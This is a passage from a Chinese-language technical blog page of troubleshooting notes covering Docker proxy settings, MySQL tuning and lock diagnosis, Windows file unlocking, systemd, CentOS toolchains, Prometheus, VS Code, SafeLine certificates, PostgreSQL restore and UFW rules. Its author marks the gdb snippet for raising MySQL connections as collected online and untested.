 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;正常来说，此类问题应该通过 &lt;code&gt;registry-mirrors&lt;/code&gt; 项配置镜像加速地址解决，但是现在这个镜像加速器能用的越来越少了，今天发现了一个新的方案，通过设置 &lt;code&gt;http_proxy&lt;/code&gt; 和 &lt;code&gt;https_proxy&lt;/code&gt; 代理解决，配置如下：
&lt;pre&gt;&lt;code&gt;### Editing /etc/systemd/system/docker.service.d/override.conf
### Anything between here and the comment below will become the contents of the drop-in file
[Service]
Environment=&amp;#34;ALL_PROXY=socks5://127.0.0.1:1080&amp;#34;
Environment=&amp;#34;NO_PROXY=localhost,127.0.0.1,.example.com&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="mysql-日志出现大量的-got-an-error-reading-communication-packets"&gt;&lt;span&gt;mysql 日志出现大量的 Got an error reading communication packets&lt;/span&gt;
 &lt;a href="#mysql-%e6%97%a5%e5%bf%97%e5%87%ba%e7%8e%b0%e5%a4%a7%e9%87%8f%e7%9a%84-got-an-error-reading-communication-packets" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 该问题多数出现于 8.0 以下, 默认设置1M，8.0以上默认设置64M
# max_allowed_packet 设置太小，数据包过大时导致连接中断
# 临时解决: SET GLOBAL max_allowed_packet = 16777216; -- 设置为16M
# 永久解决: 修改配置文件
[mysqld]
max_allowed_packet = 16M # 大多数情况下，16M 到 64M 已足够&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="windows-如何解除文件锁定"&gt;&lt;span&gt;Windows 如何解除文件锁定&lt;/span&gt;
 &lt;a href="#windows-%e5%a6%82%e4%bd%95%e8%a7%a3%e9%99%a4%e6%96%87%e4%bb%b6%e9%94%81%e5%ae%9a" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;文件锁定会导致该文件无法删除&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;利用第三方工具，比如 &lt;a href="https://www.iobit.com/en/iobit-unlocker.php" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;Unlocker&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;解锁文件&lt;/li&gt;
&lt;li&gt;利用&lt;code&gt;Microsoft&lt;/code&gt;官方工具 &lt;a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;Process Explorer&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;(打开&lt;code&gt;Process Explorer&lt;/code&gt;，点击&lt;code&gt;Find&lt;/code&gt;选项卡，然后选择&lt;code&gt;Find Handle or DLL&lt;/code&gt;，输入文件名来搜索,然后右键点击进程，结束&lt;code&gt;进程&lt;/code&gt;或者结束&lt;code&gt;进程树&lt;/code&gt;。在或者找到对应的 &lt;code&gt;Handles&lt;/code&gt;，右键 &lt;code&gt;Close Handle&lt;/code&gt;，建议优选&lt;code&gt;Close Handle&lt;/code&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="为-makefile-生成帮助文档"&gt;&lt;span&gt;为 Makefile 生成帮助文档&lt;/span&gt;
 &lt;a href="#%e4%b8%ba-makefile-%e7%94%9f%e6%88%90%e5%b8%ae%e5%8a%a9%e6%96%87%e6%a1%a3" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;.PHONY: help
help: ## 显示所有可用命令
	@echo &amp;#34;可用命令：&amp;#34;
	@grep -E &amp;#39;^[a-zA-Z_-]&amp;#43;:.*?## .*$$&amp;#39; $(MAKEFILE_LIST) | awk &amp;#39;BEGIN {FS = &amp;#34;:.*?## &amp;#34;}; {printf &amp;#34;\033[36m%-20s\033[0m %s\n&amp;#34;, $$1, $$2}&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="systemd-守护桌面程序"&gt;&lt;span&gt;Systemd 守护桌面程序&lt;/span&gt;
 &lt;a href="#systemd-%e5%ae%88%e6%8a%a4%e6%a1%8c%e9%9d%a2%e7%a8%8b%e5%ba%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 以本文记录时间时候最新的QQ Linux版 3.0.0 为例，fedora33 下经常崩溃，用systemd守护其运行，在QQ崩溃时自动重启QQ
# 运行以下命令以启动systemd守护进程 
$&amp;gt; /usr/bin/systemd-run --property Restart=on-failure --user /opt/QQ/qq
# 替换默认 /usr/share/applications/qq.desktop的执行命令 Exec=/usr/bin/systemd-run --property Restart=on-failure --user /opt/QQ/qq
# 日志检查，可以定位当前用户的日志看(或者 systemctl --user list-units run-*|grep qq，查询到systemd-run启动的service，直接定位)
$&amp;gt; journalctl -f -u user@${UID}.service&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="centos-7-系统安装其他-glibc-版本"&gt;&lt;span&gt;CentOS 7 系统安装其他 GLIBC 版本&lt;/span&gt;
 &lt;a href="#centos-7-%e7%b3%bb%e7%bb%9f%e5%ae%89%e8%a3%85%e5%85%b6%e4%bb%96-glibc-%e7%89%88%e6%9c%ac" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;code&gt;DevToolSet（Developer Toolset）&lt;/code&gt;是 &lt;code&gt;Red Hat&lt;/code&gt; 和 &lt;code&gt;CentOS&lt;/code&gt; 提供的一组开发工具集合，旨在为开发者提供最新的编译器、调试器和其他开发工具，同时保持系统稳定性。它允许用户在不升级整个系统的情况下使用更新的工具链(包含 &lt;code&gt;GCC&lt;/code&gt;、&lt;code&gt;GDB&lt;/code&gt;、&lt;code&gt;Binutils&lt;/code&gt; 等工具的更新版本)。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; sudo yum install centos-release-scl
# 需要什么版本就是 devtoolset-xxxx-gcc* 
$&amp;gt; sudo yum install devtoolset-8-gcc*
# 激活
$&amp;gt; scl enable devtoolset-8 bash&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="mysql-出现-killed-或者-waiting-for-table-metadata-lock"&gt;&lt;span&gt;MySQL 出现 KILLED 或者 Waiting for table metadata lock&lt;/span&gt;
 &lt;a href="#mysql-%e5%87%ba%e7%8e%b0-killed-%e6%88%96%e8%80%85-waiting-for-table-metadata-lock" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用 &lt;code&gt;show processlist&lt;/code&gt; 获取到线程&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;获取操作系统线程&lt;code&gt;ID&lt;/code&gt;, 如 &lt;code&gt;1213&lt;/code&gt;(&lt;code&gt;SELECT THREAD_OS_ID FROM performance_schema.threads WHERE processlist_id=1213&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;pstack&lt;/code&gt; 诊断 &lt;code&gt;pstack 13133 &amp;gt; /root/mysql_thread_13133.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自己分析生成文件或者扔给&lt;code&gt;gpt&lt;/code&gt;看&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="mysql-连接数被打满-to-many-connections无法登陆-mysql-的情况下处理方案网络搜集-未测试"&gt;&lt;span&gt;MySQL 连接数被打满 &lt;code&gt;to many connections&lt;/code&gt;，无法登陆 &lt;code&gt;mysql&lt;/code&gt; 的情况下处理方案(网络搜集-未测试)&lt;/span&gt;
 &lt;a href="#mysql-%e8%bf%9e%e6%8e%a5%e6%95%b0%e8%a2%ab%e6%89%93%e6%bb%a1-to-many-connections%e6%97%a0%e6%b3%95%e7%99%bb%e9%99%86-mysql-%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%a4%84%e7%90%86%e6%96%b9%e6%a1%88%e7%bd%91%e7%bb%9c%e6%90%9c%e9%9b%86-%e6%9c%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; gdb -p $(pidof mysqld) -batch -ex 
&amp;#34;set global max_connections=1500&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="prometheus-error-scraping-target-cannot-parse-content-type-textplain-charsetutf-8gb2312gbk-and-no-fallback_scrape_protocol-for-target-mime-invalid-media-parameter"&gt;&lt;span&gt;Prometheus Error scraping target: cannot parse Content-Type &amp;ldquo;text/plain; charset=utf-8,gb2312,gbk&amp;rdquo; and no fallback_scrape_protocol for target mime: invalid media parameter&lt;/span&gt;
 &lt;a href="#prometheus-error-scraping-target-cannot-parse-content-type-textplain-charsetutf-8gb2312gbk-and-no-fallback_scrape_protocol-for-target-mime-invalid-media-parameter" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Prometheus V3&lt;/code&gt; 版本对于 &lt;code&gt;Content-Type&lt;/code&gt; 进行了更严格的校验, 参见 &lt;a href="https://github.com/prometheus/prometheus/issues/15777" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;#15777&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;、&lt;a href="https://prometheus.io/docs/prometheus/latest/migration/#scrape-protocols" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;Prometheus Docs#scrape-protocols&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; , 解决方案：&lt;code&gt;Prometheus&lt;/code&gt; 使用 &lt;code&gt;V2&lt;/code&gt; 版本，或者指标请求返回的 &lt;code&gt;charset&lt;/code&gt; 只有一个，如 &lt;code&gt;utf-8&lt;/code&gt;。(官方推荐的设置方案这边没有测试成功)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="vscode-开启类似-pycharm-的代码提示及包自动导入功能"&gt;&lt;span&gt;vscode 开启类似 pycharm 的代码提示及包自动导入功能&lt;/span&gt;
 &lt;a href="#vscode-%e5%bc%80%e5%90%af%e7%b1%bb%e4%bc%bc-pycharm-%e7%9a%84%e4%bb%a3%e7%a0%81%e6%8f%90%e7%a4%ba%e5%8f%8a%e5%8c%85%e8%87%aa%e5%8a%a8%e5%af%bc%e5%85%a5%e5%8a%9f%e8%83%bd" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; // 需要安装插件 Pylance 
 &amp;#34;python.languageServer&amp;#34;: &amp;#34;Pylance&amp;#34;,
 &amp;#34;python.analysis.autoImportCompletions&amp;#34;: true,
 &amp;#34;python.analysis.autoSearchPaths&amp;#34;: true,
 &amp;#34;editor.quickSuggestions&amp;#34;: {
 &amp;#34;other&amp;#34;: &amp;#34;on&amp;#34;,
 &amp;#34;comments&amp;#34;: &amp;#34;on&amp;#34;,
 &amp;#34;strings&amp;#34;: &amp;#34;on&amp;#34;
 }&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="雷池safeline-在更新控制台证书后导致前端访问报告错误-err_ssl_version_or_cipher_mismatch"&gt;&lt;span&gt;雷池(SafeLine) 在更新控制台证书后，导致前端访问报告错误 ERR_SSL_VERSION_OR_CIPHER_MISMATCH&lt;/span&gt;
 &lt;a href="#%e9%9b%b7%e6%b1%a0safeline-%e5%9c%a8%e6%9b%b4%e6%96%b0%e6%8e%a7%e5%88%b6%e5%8f%b0%e8%af%81%e4%b9%a6%e5%90%8e%e5%af%bc%e8%87%b4%e5%89%8d%e7%ab%af%e8%ae%bf%e9%97%ae%e6%8a%a5%e5%91%8a%e9%94%99%e8%af%af-err_ssl_version_or_cipher_mismatch" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;该解决方案来自官方微信群80&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;临时解决: 登陆 &lt;code&gt;mgt&lt;/code&gt; 容器, 复制 &lt;code&gt;/app/cert/default.crt&lt;/code&gt; 和 &lt;code&gt;/app/cert/default.key&lt;/code&gt; 并覆盖 &lt;code&gt;/app/cert/mgt.crt&lt;/code&gt; 和 &lt;code&gt;/app/cert/mgt.key&lt;/code&gt;， 然后重启 &lt;code&gt;nginx&lt;/code&gt; 进程(注意是进程，不是 &lt;code&gt;mgt&lt;/code&gt; 容器)&lt;/li&gt;
&lt;li&gt;永久解决：执行 &lt;code&gt;docker exec safeline-pg psql -U safeline-ce -c &amp;quot;delete from mgt_options where key = 'mgt_cert';&amp;quot;&lt;/code&gt; 并重启 &lt;code&gt;mgt&lt;/code&gt; 容器；&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="pgsql-备份与恢复"&gt;&lt;span&gt;PgSql 备份与恢复&lt;/span&gt;
 &lt;a href="#pgsql-%e5%a4%87%e4%bb%bd%e4%b8%8e%e6%81%a2%e5%a4%8d" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; pg_restore -U postgres -h 127.0.0.1 -p 5432 -d &amp;lt;database&amp;gt; -C /tmp/&amp;lt;database&amp;gt;.dump

# 强制清理已有对象再恢复（类似 mysql 的 DROP &amp;#43; CREATE）
$&amp;gt; pg_restore -U postgres -h 127.0.0.1 -d &amp;lt;database&amp;gt; --clean --if-exists /tmp/&amp;lt;database&amp;gt;.dump&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="ufw-防火墙创建自定义规则"&gt;&lt;span&gt;UFW 防火墙创建自定义规则&lt;/span&gt;
 &lt;a href="#ufw-%e9%98%b2%e7%81%ab%e5%a2%99%e5%88%9b%e5%bb%ba%e8%87%aa%e5%ae%9a%e4%b9%89%e8%a7%84%e5%88%99" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 定义应用规则
$&amp;gt; vim /etc/ufw/applications.d/samba
[Samba]
title=Samba File Sharing
description=Allow Samba (NetBIOS/SMB) ports
ports=137,138/udp|139,445/tcp

# 更新 UFW 应用列表
$&amp;gt; ufw app update samba

# 开启应用规则
$&amp;gt; ufw allow samba # ufw allow from &amp;lt;网段&amp;gt;/&amp;lt;子网掩码&amp;gt; to any port samba&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="利用-aws-cloudfront-的-cloudfront-函数-实现域名非www跳转www域名"&gt;&lt;span&gt;利用 AWS CloudFront 的 CloudFront 函数 实现域名非www跳转www域名&lt;/span&gt;
 &lt;a href="#%e5%88%a9%e7%94%a8-aws-cloudfront-%e7%9a%84-cloudfront-%e5%87%bd%e6%95%b0-%e5%ae%9e%e7%8e%b0%e5%9f%9f%e5%90%8d%e9%9d%9ewww%e8%b7%b3%e8%bd%acwww%e5%9f%9f%e5%90%8d" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
